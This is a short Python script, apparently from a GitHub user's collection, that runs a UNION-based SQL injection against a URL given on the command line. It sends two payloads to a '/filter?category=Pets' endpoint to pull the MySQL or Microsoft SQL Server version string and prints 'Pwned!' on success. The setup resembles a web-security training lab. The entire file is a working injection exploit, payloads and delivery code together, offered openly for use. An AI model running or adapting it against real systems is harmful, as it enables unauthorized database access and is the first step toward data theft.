#!/usr/bin/env python3
# https://github.com/wvverez
# SQL injection attack, querying the database type and version on MySQL and Microsoft
 
import requests, sys
if len(sys.argv) != 2: print(f"[+] Uso: {sys.argv[0]} (url)"); sys.exit(1)
url = sys.argv[1].rstrip('/')
payloads = ["' UNION SELECT @@version, NULL-- ", "' UNION SELECT @@version, NULL# "]
for p in payloads:
    r = requests.get(f"{url}/filter?category=Pets{p}")
    if "8.0.42" in r.text:
        print(f">>> [+] Pwned!")
        break
else:
    print(">>> [+] Fallo")